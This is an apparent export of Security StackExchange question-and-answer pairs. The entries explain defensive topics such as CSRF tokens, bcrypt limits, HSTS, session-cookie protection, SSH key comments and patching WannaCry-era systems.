<p>A slightly different concern when this data can be sold is competitive intelligence / corporate espionage. In the scenario where a company does a lot of research-intensive work at their headquarters located in some small geographical location (think of pharmaceuticals or a defense contractor) selling that data makes it possible for anyone to buy all of the traffic from the local ISP where most of those researchers live and analyze what they are looking for when at home, possibly even directly from the ISP hosting the traffic for their corporate headquarters. If other countries aren't selling similar data it gives foreign companies and companies wise enough to try and buy this data a huge technical advantage. Likewise, it would also allow foreign governments to buy ISP traffic which includes the data from US (or other government) Officials homes.   </p>

<p>Imagine companies monitoring their employee's behavior at home or on their mobile devices.</p>

<p>This will likely have a chilling effect on activists and whistle-blowers as well.</p>

<p>Likewise, if credit cards or PII are sent in the clear to a poorly secured remote site your ISP's data set now has a potential PCI or PII regulatory issue on their hands. So this amplifies data-leakage problems of all types by making additional copies of the data leaked. </p>

<p>With the examples I've just mentioned above, and there are hundreds of others, it should be easy to see why this type of data collection has a different level of importance to it than just metadata or basic connection information. Even if your ISP never sells this data they are collecting quite an interesting dataset. </p>

<p><strong>It's a security issue that definitely has a lot of potential long-term security implications.</strong> </p>
","155060"
"How do mobile carriers know video resolution over HTTPS connections?","21201","","<p>Verizon is modifying their ""unlimited"" data plans. Customers in the USA can stream video at 480p -or- pay to unlock higher resolutions (both 720p and +1080p). They are not the only mobile carrier to implement rules like <a href=""https://www.theverge.com/2017/10/25/16546798/verizon-unlimited-data-full-video-quality-fee"" rel=""noreferrer"">this</a>.</p>

<p>If I am on a site that implements HTTPS for video streaming, say YouTube or Facebook, how do carriers know what resolution I'm watching? If carriers are throttling bandwidth for all data, then talking about video resolutions seems like misdirection. If it's only video, that would seem to raise privacy concerns.</p>
","<p>This is an active area of research. I happen to have done some work in this area, so I'll share what I can about the basic idea (this work was with industry partners and I can't share the secret details :) ).</p>

<p>The tl;dr is that it's often possible to identify an encrypted traffic stream as carrying video, and it's often possible to estimate its resolution - but it's complicated, and not always accurate. There are a lot of people working on ways to do this more consistently and more accurately.</p>

<p>Video traffic has some specific characteristics that can distinguish it from other kinds of traffic. Here I refer specifically to video on demand - not live streaming video. Video on demand doesn't often have those priority tags mentioned in <a href=""https://security.stackexchange.com/a/172214/84752"">this answer</a>. Also I refer specifically to adaptive video, meaning that the video is divided into segments (each about 2-10 seconds long), and each segment of video is encoded at multiple quality levels (quality level meaning: long-term video bitrate, codec, and resolution). As you play the video, the quality level at which the next segment is downloaded depends on what data rate the application thinks your network can support. (That's the DASH protocol referred to in <a href=""https://security.stackexchange.com/a/172219/84752"">this answer</a>.)</p>

<p>If your phone is playing a video, and you look at the (weighted moving average of) data rate of the traffic going to your phone over time, it might look something like this:</p>

<p><a href=""https://i.stack.imgur.com/4HcXT.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/4HcXT.png"" alt=""data rate over time""></a></p>

<p>(this is captured from a YouTube session over Verizon. There's the moving average over 15 seconds and also short-term average.)</p>

<p>There are a few different parts to this session:</p>

<p>First, the video application (YouTube player) tries to fill the buffer up to the buffer capacity. During this time, it is pulling data at whatever rate the network can support. At this stage, it's basically indistinguishable from a large file download, unless you can infer that it's video traffic from the remote address (as mentioned in <a href=""https://security.stackexchange.com/a/172221/84752"">this answer</a>).</p>

<p>Once the buffer is full, then you get ""bursts"" at sort-of-regular intervals. Suppose your buffer can hold 200 seconds of video. When the buffer has 200 seconds of video in it, the application stops downloading. Then after a segment of video has played back (say 5 seconds), there is room in the buffer again, so it'll download the next segment, then stop again. That's what causes this bursty pattern. </p>

<p>This pattern is very characteristic of video - traffic from other applications doesn't have this pattern - so a network service provider can pretty easily pick out flows that carry video traffic. In some cases, you might not ever observe this pattern - for example, if the video is so short that the <em>entire thing</em> is loaded into the buffer at once and then the client stops downloading. Under those circumstances, it's very difficult to distinguish video traffic from a file download (unless you can figure it out by remote address).</p>

<p>Anyway, once you have identified the flow as carrying video traffic - either by the remote address (not always possible, since major video providers use content distribution networks that are not exclusive to video) or by its traffic pattern (possible if the video session is long, much more difficult if it is so short that the whole video is loaded into the buffer all at once)...</p>

<p>Now, as <a href=""https://security.stackexchange.com/a/172219/84752"">Hector said</a>, you can try to guess the resolution from the bitrate by looking at the size (in bytes) of each ""burst"" of data:</p>

<blockquote>
  <p>From the size per duration you could make a reasonable estimate of the resolution - especially if you keep a rolling average.</p>
</blockquote>

<p>But, this can be difficult. Take the YouTube session in my example:</p>

<ul>
<li>Not all segments are the same duration - the duration of video requested at a time depends on several factors (the quality level, network status, what kind of device you are playing the video on, and others). So you can't necessarily look at a ""burst"" and say, ""OK, this was X bytes representing 5 seconds of video, so I know the video data rate"". Sometimes you can figure out the likely segment duration but other times it is tricky.</li>
<li>For a given video quality level and segment duration, different segments will have different sizes (depending on things like how much motion takes place in that part of the video).</li>
<li>Even for the same video resolution, the long-term data rate can vary - a 1080p video encoded with VP9 won't have the same long-term data rate as one encoded with H.264.</li>
<li>The video quality level changes according to perceived network quality (which is visible to the network service provider) and buffer status (which is not). So you can look at long-term data rates over 30 seconds, but it's possible that the actual video quality level changed several times over that 30 seconds.</li>
<li>During periods when the buffer is draining or filling as fast as possible (when you don't have those ""bursts""), it's much harder to estimate what's going on in the video.</li>
<li>To complicate things even further: sometimes a video flow will be ""striped"" across multiple lower-layer flows. Sometimes part of the video will be retrieved from one address, and then it will switch to retrieving the video from a different address.</li>
</ul>

<p>That graph of data rate I showed you just above? Here's what the video resolution was over that time interval:</p>

<p><a href=""https://i.stack.imgur.com/fTtd3.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/fTtd3.png"" alt=""video resolution""></a></p>

<p>Here, the color indicates the video resolution. So... you can <em>sort of</em> estimate what's going on just from the traffic patterns. But it's a difficult problem! There are other markers in the traffic that you can look at. I can't say definitively how any one service provider is doing it. But at least as far as the academic state-of-the-art goes, there isn't any way to do this with perfect accuracy, all of the time (unless you have the cooperation of the video providers...)</p>

<p>If you're interested in learning more about the techniques used for this kind of problem, there's a lot of academic literature out there - see for example <a href=""http://www.ida.liu.se/~venkr00/papers/mmsys17.pdf"" rel=""noreferrer"">BUFFEST: Predicting Buffer Conditions and Real-time Requirements of HTTP(S) Adaptive Streaming Clients</a> as a starting point. (Not my paper - just one I happen to have read recently.)</p>
","172264"
"Is it normal that my new VISA debit card has almost the same number as the old one? Is it secure?","21196","","<p>My bank issued me a new debit card (VISA Electron) because the old one expired and to my surprise, the card number is almost the same as on my old card. I don't think there would be much chance that this is a coincidence so is it a common practice that card companies somehow reserve numbers for their clients and then use them? (My old card has been issued in 2008, my new card in 2011.)</p>

<p>Is it secure to use a very similar card number?</p>
","<p>Almost the same -> they are different. </p>

<p>And there is some procedure on how those number are generated: the issuer has some code, the bank usually have some code, etc. You can take a look <a href=""http://www.merriampark.com/anatomycc.htm"" rel=""nofollow"">at this site</a>.</p>

<p>If you ask two credit cards from the same issuer, same bank, you'll see that there are lots of numbers in common.</p>

<p>And even some cards have the same number, reissued, when they expire. So, you have received the same number again.</p>
","7649"
"Are two firewalls better than one?","21179","","<p>Let's say that our first firewall has some vulnerability and a malicious person is able to exploit it. If there's a second firewall after it, he/she should be able to stop the attack, right?</p>

<p>Also, what will be the side-effects? I mean, would this slow the traffic or not? What are other possible effects like this one?</p>

<p>Here is what I mean for configuration:</p>

<ul>
<li>Firewall 1 → Firewall 2 → Network</li>
<li>Firewall 1 is different from Firewall 2</li>
</ul>
","<p><img src=""https://i.stack.imgur.com/JjaRg.png"" alt=""DMZ""></p>

<p>There are both advantages and disadvantages having two firewalls. While firewalls are not commonly exploited, they are prone to denial of service attacks.</p>

<p>In a topology with a single firewall serving both internal and external users (LAN and WAN), it acts as a shared resource for these two zones. Due to limited computing power, a denial of service attack on the firewall from WAN can disrupt services on the LAN. </p>

<p>In a topology with two firewalls, you protect internal services on the LAN from denial of service attacks on the perimeter firewall. </p>

<p>Of course, having two firewalls will also increase administrative complexity - you need to maintain two different firewall policies + backup and patching.</p>

<p>Some administrators prefer to only filter ingress traffic - this simplifies the firewall policy. The other practice is to maintain two seperate rulesets with both outbound and inbound filtering. If you need an opening from LAN to WAN, you will have to implement the rule on both firewalls. The rationale behind this is that a single error will not expose the whole network, only the parts the firewall is serving directly. The same error has to be done twice.</p>

<p>The main disadvantage is cost and maintenance, but in my opinion the advantages outweighs these.</p>
","62218"
"Does bcrypt have a maximum password length?","21176","","<p>I was messing around with bcrypt today and noticed something:</p>

<pre><code>hashpw('testtdsdddddddddddddddddddddddddddddddddddddddddddddddsddddddddddddddddd', salt)
Output: '$2a$15$jQYbLa5m0PIo7eZ6MGCzr.BC17WEAHyTHiwv8oLvyYcg3guP5Zc1y'

hashpw('testtdsdddddddddddddddddddddddddddddddddddddddddddddddsdddddddddddddddddd', salt)
Output: '$2a$15$jQYbLa5m0PIo7eZ6MGCzr.BC17WEAHyTHiwv8oLvyYcg3guP5Zc1y'
</code></pre>

<p>Does bcrypt have a maximum password length?</p>
","<p>Yes, bcrypt has a maximum password length. The <a href=""https://www.usenix.org/legacy/events/usenix99/provos/provos_html/node4.html"" rel=""noreferrer"">original article</a> contains this:</p>

<blockquote>
  <p>the key argument is a secret encryption key, which can be a user-chosen password of up to 56 bytes (including a terminating zero byte when the key is an ASCII string).</p>
</blockquote>

<p>So one could infer a maximum input password length of 55 characters (not counting the terminating zero). ASCII characters, mind you: a generic Unicode character, when encoded in UTF-8, can use up to <em>four</em> bytes; and the visual concept of a <em>glyph</em> may consist of an unbounded number of Unicode characters. You will save a lot of worries if you restrict your passwords to plain ASCII.</p>

<p>However, there is a considerable amount of confusion on the actual limit. Some people believe that the ""56 bytes"" limit includes a 4-byte salt, leading to a lower limit of 51 characters. Other people point out that the algorithm, internally, manages things as 18 32-bit words, for a total of 72 bytes, so you could go to 71 characters (or even 72 if you don't manage strings with a terminating zero).</p>

<p><strong>Actual <em>implementations</em></strong> will have a limit which depends on what the implementer believed and enforced in all of the above. All decent implementations will allow you at least 50 characters. Beyond that, support is not guaranteed. If you need to support passwords longer than 50 characters, you can add a preliminary hashing step, as discussed <a href=""https://security.stackexchange.com/questions/6623/pre-hash-password-before-applying-bcrypt-to-avoid-restricting-password-length"">in this question</a> (but, of course, this means that you no longer compute ""the"" bcrypt, but a local variant, so interoperability goes down the drain).</p>

<p><strong>Edit:</strong> it has been pointed out to me that although, from a cryptographer's point of view, the <em>article</em> is the ultimate reference, this is not necessarily how the designers thought about it. The ""original"" implementation could process up to 72 bytes. Depending on your stance on formalism, you may claim that the implementation is right and the article is wrong. Anyway, such is the current state of things that my advice remains valid: if you keep under 50 characters, you will be fine everywhere. (Of course it would have been better if the algorithm did not have a length limitation in the first place.)</p>
","39851"
"Checking domains HSTS status","21173","","<p>The Google Chrome browser offers a quick way to check a domain's HSTS (HTTP Strict Transport Security) status via the page <code>chrome://net-internals/#hsts</code> (section <em>Query domain</em>).</p>

<p>The query result looks e.g. like this:</p>

<pre><code>Found:
domain: owasp.org
static_upgrade_mode: UNKNOWN
static_sts_include_subdomains: 
static_pkp_include_subdomains: 
static_sts_observed: 
static_pkp_observed: 
static_spki_hashes: 
dynamic_upgrade_mode: STRICT
dynamic_sts_include_subdomains: false
dynamic_pkp_include_subdomains: false
dynamic_sts_observed: 1409173001.03746
dynamic_pkp_observed: 1409173001.03746
dynamic_spki_hashes: 
</code></pre>

<p>What do these lines mean? Is the HSTS mode enabled or not? What is the difference between the <code>dynamic_</code> and <code>static_</code> entries of the result?</p>
","<p>If either of the <code>static_upgrade_mode:</code> or the <code>dynamic_upgrade_mode:</code> lines are set to <code>STRICT</code> then HSTS is enabled.</p>

<h1>Dynamic</h1>

<p><code>Dynamic</code> means that the browser has been instructed to enable HSTS by an HTTP response header (served over TLS) similar to the following:</p>

<p><code>Strict-Transport-Security: max-age=157680000; includeSubDomains;</code></p>

<p>This is vulnerable to an attack whereby the very first time the browser requests the domain with <code>http://</code> (not <code>https://</code>) an adversary intercepts the communication.</p>

<h1>Static</h1>

<p>In order to overcome this weakness we have the <code>static</code> mode which allows for hard-coding HSTS records directly into the browser's source. The header is changed to indicate the administrator's intention:</p>

<p><code>Strict-Transport-Security: max-age=157680000; includeSubDomains; preload</code></p>

<p>Note the inclusion of <code>preload</code> at the end. The domain is then <a href=""https://hstspreload.appspot.com/"">submitted</a> for manual review. If approved then it is added to <a href=""https://chromium.googlesource.com/chromium/src/net/+/master/http/transport_security_state_static.json"">the Chromium list</a> which is also included in the Firefox, Safari, and IE 11+Edge lists.</p>
","98257"
"Mitigate MS17-010 on Windows XP? (wannacry ransomware)","21158","","<p>On my network I have to run two XP VM, because of legacy programs.</p>

<p>How can I mitigate MS17-010 on Windows XP? The machines are not directly exposed to internet, but they must be connected to the LAN.</p>

<p>Is enough to disable SMB server for avoid having my VM infected? I don't need a SMB server on the machine, but I need to access SMB clients from it.</p>
","<p>Microsoft released patches for all operating systems in <em>custom support</em>. Please see <a href=""https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/"" rel=""noreferrer"">here</a>.</p>

<p>For English language patches, direct links are <a href=""http://download.windowsupdate.com/d/csa/csa/secu/2017/02/windowsserver2003-kb4012598-x64-custom-enu_f24d8723f246145524b9030e4752c96430981211.exe"" rel=""noreferrer"">Windows XP SP2 x64</a> and <a href=""http://download.windowsupdate.com/d/csa/csa/secu/2017/02/windowsxp-kb4012598-x86-custom-enu_eceb7d5023bbb23c0dc633e46b9c2f14fa6ee9dd.exe"" rel=""noreferrer"">Windows XP SP3 x86</a>. Localized version of the patch can be found <a href=""http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598"" rel=""noreferrer"">here</a>. Rest of the links can be found on the bottom of the blog post.</p>
","159375"
"How does a CSRF token prevent an attack, and how can I safely use/avoid it for my JSON API?","21119","","<p>I'm trying to make an iOS app communicate with a Ruby on Rails website using JSON. While trying to post a login to create a user session, I discovered I was missing a CSRF token. I had no idea what that is at all, so I started looking into it, and found some solutions that say to remove the CSRF protection if the call format is 'application/json'. But that sounds like that leaves the website vulnerable? </p>

<p>Some results came up about JS forms having the same issue. The answers there were to add in the CSRF token. Which upon inspection, also appears to be in meta content tag in page headers.</p>

<p>So this leaves me in confusion, here's my questions:</p>

<ul>
<li>How does the token help protect anything if it can be read in prior call to the attacking call? Can a malicious site not simply make a request, parse the received message, and send another request with the token?</li>
<li>Would it be safe to disable the token-check on the login post action, and have it send back the token along with the success response? If not, any better suggestions?</li>
</ul>
","<p>A summary of how CSRF attacks work goes like this: </p>

<ol>
<li>You, the good user, while logged into a web site A, visit some other site's page B.</li>
<li>That page does a GET (can be a POST, a little more complex to set
up) to a page X on site A (which you are logged in to), with e.g.
. Your browser obliges, using your already authenticated session/cookie</li>
<li>Page X by design causes change in state of your account -
classic examples are ""transfer X dollars to B"" (less realistic) or
""set user status line to PWNED"" (more realistic)</li>
</ol>

<p>There are a number of ways a CSRF token can be implemented, but the idea is that a simple GET request to a state-changing URL X will not work unless an additional changing piece of information (the token) is included, e.g. it has to be ""X?token=123123213"". Since the token changes reasonably often, the step 2 above will not work. The would-be attacker does not know the current token.</p>

<p>Your question 1 - the attacker does not see the content of the page X, he only forces you to visit it.</p>

<p>Your question 2 - since this is all about actions when already logged in, it is more or less ok to not use CSRF protection on the login page. There is a chance that you can be forced to log in as someone else and not notice it, though.</p>

<p><a href=""http://en.wikipedia.org/wiki/Cross-site_request_forgery"">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p>

<p>A more general class of issues is <a href=""http://en.wikipedia.org/wiki/Confused_deputy_problem"">http://en.wikipedia.org/wiki/Confused_deputy_problem</a></p>
","25902"
"I just send username and password over https. Is this ok?","21070","","<p>When a user's logging in to my site, they send their username and password to me over https.  Besides the ssl, there's no special obfuscation of the password - it lives in memory in the browser in the clear.</p>

<p>Is there anything else I should do? Should I keep it hashed somehow, even in RAM?</p>
","<p>This is fine.  You don't need to do anything else.  There is no need to hash it or obfuscate it in RAM.</p>

<p>You should be careful to hash the password appropriately on the server side before storing it in persistent memory (e.g., in a database), and you should take care to use proper methods for password hashing.  See, e.g., <a href=""https://security.stackexchange.com/q/211/971"">How to securely hash passwords?</a>, <a href=""https://security.stackexchange.com/q/5605/971"">Which password hashing method should I use?</a>, <a href=""https://security.stackexchange.com/questions/4789/most-secure-password-hash-algorithms/4801#4801"">Most secure password hash algorithm(s)?</a>, <a href=""https://security.stackexchange.com/q/4781/971"">Do any security experts recommend bcrypt for password storage?</a>.</p>

<p>If you want to provide additional security for your users, here are some steps you could take:</p>

<ul>
<li><p>Use site-wide SSL/TLS.  Any attempt to visit your site through HTTP should immediately redirect to HTTPS.</p></li>
<li><p>Enable <a href=""http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"" rel=""nofollow noreferrer"">HSTS</a> on your site.  This tells browsers to only connect to you via HTTPS. Paypal uses it.  It is supported in recent versions of Firefox and Chrome.</p></li>
<li><p>Buy an EV cert.  This gives users an extra cue (the green glow) that may help some alert users notice when they are under attack.  However, it is not clear whether this will be effective in practice, for typical users, so there is some debate about whether EV certs add any value at all.</p></li>
</ul>

<p>I'm not saying you need to do these things (though site-wide SSL/TLS makes a big difference).  But these are some options that can help strengthen security against some common attack vectors.</p>
","7058"
"What are the differences between the arcfour, arcfour128 and arcfour256 ciphers in OpenSSH?","21069","","<p>What are the differences between the <code>arcfour</code>, <code>arcfour128</code> and <code>arcfour256</code> ciphers in OpenSSH?</p>

<p>I am interested about: speed and security implications. </p>

<p>I know that arcfour is fast for file transfers, but I don't know which one to pick.</p>
","<p>The ""arcfour"" cipher is defined in <a href=""http://tools.ietf.org/html/rfc4253"" rel=""nofollow noreferrer"">RFC 4253</a>; it is plain RC4 with a 128-bit key.</p>

<p>""arcfour128"" and ""arcfour256"" are defined in <a href=""http://tools.ietf.org/html/rfc4345"" rel=""nofollow noreferrer"">RFC 4345</a>. They use a key of 128-bit or 256-bit, respectively. Moreover, and contrary to plain ""arcfour"", they also include a ""discard"" step: the very first 1536 bytes produced by the cipher are dropped. This is done because the first bytes of RC4 output tend to exhibit biases, which are rarely fatal to your security, but worrisome nonetheless. ""arcfour128"" and ""arcfour256"" are thus ""more secure"" than plain ""arcfour"".</p>

<p>Note that the extended key size of arcfour256 <a href=""https://security.stackexchange.com/questions/6141/amount-of-simple-operations-that-is-safely-out-of-reach-for-all-humanity/6149#6149"">does not buy you much</a>: a 128-bit key is already more than enough to defeat key cracking through brute force. A 256-bit key is more for aesthetic than rational reasons (there is a widespread belief among auditors that bigger keys are always better, just like there is a widespread belief among people in general that bigger cars are always better).</p>

<p>Note also that while dropping the first 1536 bytes of output fixes issues with the biases in the first 1536 bytes (of course...), it does nothing against the <em>other</em> biases in RC4 output (RC4 output can be distinguished from randomness after about one gigabyte). There again, these biases have never proven fatal in any deployed protocol; however, they ""look bad"" in audit conditions.</p>

<p>As for performance, there shall be no difference whatsoever, since RC4 speed does not depend upon key size. The extra 1536 bytes implied by arcfour128 and arcfour256 theoretically induce a small one-time extra cost, but that's way below the millisecond worth of CPU even on an asthmatic embedded ARM or Mips, so this would be very hard to even <em>detect</em> in practice.</p>

<p><strong>Summary:</strong> use arcfour128 when possible, fallback to arcfour. Use arcfour256 if you need to impress bureaucrats by spewing out huge numbers that they will not understand, but which will cow them into submission.</p>

<p><em>However</em>, network is usually the bottleneck, so even over gigabit ethernet, AES-based ciphers should provide the same actual speed than RC4, and with arguably better security (even in the skewed view of auditors). If unsure, measure; don't believe one cipher to be faster than another because you read it as some old lore which was thought out at a time when a PentiumPro was the summit of Earth-based technology.</p>
","26766"
"Browsing file/directory structure of a website","21066","","<p>I want to know whether can we browse file/directory structure of any website. If yes, then how? If no, why can't we?</p>
","<p>Can you? Yes and No.</p>

<p>Yes if the website is either compromised, badly secured or the owner wants the site structure to be browseable.</p>

<p>No in other cases.</p>

<p>So the right question would be: why a website's directory structure must not be browsable? </p>

<p>For this last question, you may read the good answers to this question: <a href=""https://security.stackexchange.com/questions/56514/php-files-browsable-is-this-a-vulnerability"">PHP files browsable: is this a vulnerability?</a></p>
","99798"
"Can you track someone using a proxy?","21046","","<p>This is past experience, and is not the case anymore since I am a programmer now and have nothing to do with security anymore. However in the past I had a person constantly trying to make comments of spam type (definitely a troll and not a bot). So I have blocked his ip. Lo and behold he comes back saying that I can't block him because he has more proxies he can use.  I didn't know about existence of IT Security then, and now that I have found it, I can ask you guys here. This has happened in the past, and is not true anymore. But I am wondering is there a way I might have been able to track the person hiding behind proxies.</p>
","<p>A proxy is a system which relays communications. From your server, you see the communication as coming from the proxy machine. The IP address you see is the one of the proxy. If you block that IP, you block all traffic coming from that proxy, but no traffic from elsewhere. If the villain switches to another proxy, he will pass.</p>

<p>Some <em>HTTP</em> proxy add a header line <a href=""https://en.wikipedia.org/wiki/X-Forwarded-For"">X-Forwarded-For</a> which identifies the true source IP address. Note, though, that if the proxy system is under control of the perpetrator, then he can configure it not to include that header, or, worse, to include a fake <code>X-Forwarded-For</code> value.</p>
","38445"
"Should I publish my public SSH key with user@hostname at the end?","21027","","<p>In <code>~/.ssh/id_rsa.pub</code> my public key is stored as:</p>

<blockquote>
  <p>ssh-rsa magicmagicmagicmagic...magicmagic username@hostname</p>
</blockquote>

<p>When publishing my public key, should I include the <code>username@hostname</code> bit? Can I replace it with something else? My concerns are that:</p>

<ul>
<li>I may want to change the label for vanity purposes (<code>super@wishihadbetterhostname</code>) - but I don't want to mess things up by doing this (for example, if a common tool assumes this convention is upheld)</li>
<li>I'm concerned that I'm making it that much easier to get onto my machine by giving away my username and hostname!</li>
</ul>
","<p>The user@hostname part is just a comment, you can set your own comment by using the -C option or for existing keys change it with -c (<a href=""http://man7.org/linux/man-pages/man1/ssh-keygen.1.html"" rel=""noreferrer"">http://man7.org/linux/man-pages/man1/ssh-keygen.1.html</a>) changing it will not affect your key, so yes, you can change it to superduperuser@somfancehostname.</p>

<p>Snippet for these ssh-keygen options:</p>

<pre><code> -C comment
         Provides a new comment.

 -c      Requests changing the comment in the private and public key
         files.  This operation is only supported for RSA1 keys.  The
         program will prompt for the file containing the private keys,
         for the passphrase if the key has one, and for the new comment.
</code></pre>

<p>For instance,</p>

<p>You'd simply do <code>ssh-keygen -C thebiglebowski@thedude.com</code> and that results in the following:</p>

<p><a href=""https://i.stack.imgur.com/5GLyh.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/5GLyh.png"" alt=""thebiglebowski@thedude.com appears as a comment when you cat the pub file""></a></p>
","50883"
"Secure Session Cookies","21026","","<p>While looking up methods for creating secure session cookies I came across this publication: <a href=""http://www.cse.msu.edu/~alexliu/publications/Cookie/cookie.pdf"">A Secure Cookie Protocol</a>. It proposes the following formula for a session cookie:</p>

<pre><code>cookie = user | expiration | data_k | mac
</code></pre>

<p>where</p>

<ul>
<li><code>|</code> denotes concatenation.</li>
<li><code>user</code> is the user-name of the client.</li>
<li><code>expiration</code> is the expiration time of the cookie.</li>
<li><code>data_k</code> is encrypted data that's associated with the client (such as a session ID or shopping cart information) encrypted using key <code>k</code>.
<ul>
<li><code>k</code> is derived from a private server key <code>sk</code>; <code>k = HMAC(user | expiration, 
sk)</code>.</li>
<li><code>data_k</code> could be encrypted using <code>AES</code> using the key <code>k</code>.</li>
</ul></li>
<li><code>mac</code> is an HMAC of the cookie to verify the authenticity of the cookie; <code>mac = HMAC(user | expiration | data | session-key, k)</code>.
<ul>
<li><code>data</code> is the unencrypted data associated with the client.</li>
<li><code>session-key</code> is the SSL session key.</li>
</ul></li>
<li><code>HMAC</code> is <code>HMAC-MD5</code> or <code>HMAC-SHA1</code>.</li>
</ul>

<p>According to the paper, it provides cookie confidentiality, and prevents against replay and volume attacks. To me (being an amateur in security/cryptography) this looks pretty good. How good is this method for session cookies or cookies in general?</p>
","<p>Yes, this does look like a pretty good scheme for protecting cookies.</p>

<p>Another more recent scheme in this area is <a href=""https://tools.ietf.org/html/draft-secure-cookie-session-protocol-02"">SCS: Secure Cookie Sessions for HTTP</a>, which is a solid scheme, very well thought-out.  I recommend reading the security discussion of that document to get a good sense of what the security threats may be.</p>

<p>To help understand the purpose and role of the cookie scheme you mention, let me back up and provide some context.  It is common that web applications need to maintain session state: i.e., some state whose lifetime is limited to the current session, and that is bound to the current session.  There are two ways to maintain session state:</p>

<ol>
<li><p><em>Store session state on the server.</em> The web server feeds the browser a session cookie: a cookie whose only purpose is to hold a large, unguessable bit-string that serves as the session identifier.  The server keeps a lookup table, with one entry per open session, that maps from the session identifier to all of the session state associated with this session.  This makes it easy for web application code to retrieve and update the session state associated with a particular HTTP/HTTPS request.  Most web application frameworks provide built-in support for storing session state on the server side.</p>

<p>This is the most secure way to store session state.  Because the session state is stored on the server, the client has no direct access to it.  Therefore, there is no way for attackers to read or tamper with session state (or replay old values).  It does require some extra work to keep session state synchronized across all servers, if your web application is distributed across multiple back-end compute nodes.</p></li>
<li><p><em>Store session state on the client.</em>  The other approach is to put session state in a cookie and send the cookie to the browser.  Now each subsequent request from the browser will include the session state.  If the web application wants to modify the session state, it can send an updated cookie to the browser.</p>

<p>If done naively, this is a massive security hole, because it allows a malicious client to view and modify the session state.  The former is a problem if there is any confidential data included in the session state.  The latter is a problem if the server trusts or relies upon the session state in any way (for example, consider if the session state includes the username of the logged-in user, and a bit indicating whether that user is an administrator or not; then a malicious client could bypass the web application's authentication mechanism).</p>

<p>The proposal you mention, and the SCS scheme, are intended to defend against these risks as well as possible.  They can do so in a way that is mostly successful.  However, they cannot prevent a malicious client from deleting the cookie (and thus clearing the session state).  Also, they cannot prevent a malicious client from replaying an older value of the cookie (and thus resetting the session state to an older value), if the older version came from within the same session.  Therefore, the developer of the web application needs to be aware of these risks and take care about what values are stored in session state.</p></li>
</ol>

<p>For this reason, storing session state in cookies is a bit riskier than storing it on the server, even if you use one of these cryptographic schemes to protect cookies.  (However, if you <em>are</em> going to store session state in cookies, I definitely recommend you use one of these two schemes to protect the values in the cookies.)</p>

<p>Why would anyone store session state in cookies, given that it can just as easily be stored on the server side?  Most of the time, there is no reason to.  However, in some exceptional cases -- such as a HTTP server that is extremely constrained in the amount of storage it has, or in load-balanced web applications that are distributed across multiple machines without good support for synchronized session state -- there might be justifiable reasons to consider storing session state in cookies, and then using one of these schemes is a good idea.</p>

<p>P.S. A related topic: if you use <a href=""http://msdn.microsoft.com/en-us/magazine/ff797918.aspx"">ASP.NET View State</a>, make sure you configure it to be encrypted and authenticated: i.e., <a href=""http://msdn.microsoft.com/en-us/library/aa479501.aspx"">configure <code>ViewStateEncryptionMode</code> to <code>Always</code></a> and <code>EnableViewStateMac</code> to <code>true</code>; if you use multiple server nodes, generate a strong cryptographic key and <a href=""http://msdn.microsoft.com/en-us/library/ff649308.aspx"">configure each server's <code>machineKey</code> to use that key</a>.  Finally, make sure you have an up-to-date version of the ASP.NET framework; older versions <a href=""https://technet.microsoft.com/en-us/security/bulletin/MS10-070"">had a serious security flaw</a> <a href=""http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3332"">in the ViewState crypto</a>.</p>
","7409"
"Why use an authentication token instead of the username/password per request?","20949","","<p>The author of <a href=""https://stackoverflow.com/a/477578/14731"">https://stackoverflow.com/a/477578/14731</a> recommends:</p>

<blockquote>
  <p>DO NOT STORE THE PERSISTENT LOGIN COOKIE (TOKEN) IN YOUR DATABASE, ONLY A HASH OF IT! [...] use strong salted hashing (bcrypt / phpass) when storing persistent login tokens.</p>
</blockquote>

<p>I was under the impression that login cookies served two purposes:</p>

<ol>
<li>UX benefit: don't ask the user to login once per request</li>
<li>Performance benefit: don't need to run a slow algorithm (like bcrypt) per request</li>
</ol>

<p>It seems the author is invalidating the second point, which makes me wonder: why bother with authentication tokens at all? Instead of mapping the username/password to a randomly-chosen authentication token, why not simply pass the username/password per request using a <code>httpOnly</code>, <code>secure</code> cookie?</p>

<p>Assuming we accept the author's recommendation and use bcrypt per request, <strong>what's the advantage of using an authentication token instead a username/password?</strong></p>
","<p>When you use an ""authentication token"", the simple presentation of that token by the client grants access (as long as the token is deemed valid by the server). If you store the tokens ""as is"" in your server's database, then an attacker who could get a glimpse at your database will immediately learn all the tokens, allowing him to send requests in the name of all users for whom a valid token still exists in the database. This is bad. Hence the recommendation of storing only a <em>hash</em> of the authentication token.</p>

<p>The advice about bcrypt <em>for authentication tokens</em> is misguided. Bcrypt, like all functions dedicated to <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords/31846#31846"">password hashing</a>, is meant to be used for <em>passwords</em>. Passwords are weak; they are vulnerable to dictionary attacks. To cope with their inherent weakness, the password hashing function must be salted (to prevent parallel attacks and precomputed tables) and must also be awfully slow (through a huge number if internal iterations). This makes password hashing functions <em>expensive</em>. So you don't want to use a password hashing function unless you need it, e.g. to hash a password.</p>

<p>An authentication token is not a password; it is a random value which was generated and remembered by a computer, without any human brain involved in the process. As such, if you generated the token properly (at least 128 bits, obtained from a <a href=""http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator"" rel=""noreferrer"">cryptographically secure PRNG</a>), then there is no need for salts or iterations; just use a plain hash function (even MD5 would be fine there). This will be more efficient.</p>

<p>As for using a random authentication token instead of login+password for each request, there are two main reasons for that:</p>

<ol>
<li><p><em>Performance:</em> as explained above, an authentication token can be verified safely with a simple hash, which will be vastly more efficient than a heavy bcrypt call. You want to keep your precious CPU cycles for when they are really useful, in particular when applying bcrypt to an actual human-managed password.</p></li>
<li><p><em>Client-side storage:</em> the authentication token will be stored on the client as a cookie value. If the login and password are sent back with every request, then they are stored as a cookie on the client. People get nervous when their passwords are written to files -- and such storage is not equivalent (from a security point of view) to the storage of an authentication token, because human user are on the (bad) habit of reusing their passwords for multiple systems, whereas authentication tokens are inherently server-specific.</p></li>
</ol>
","63438"
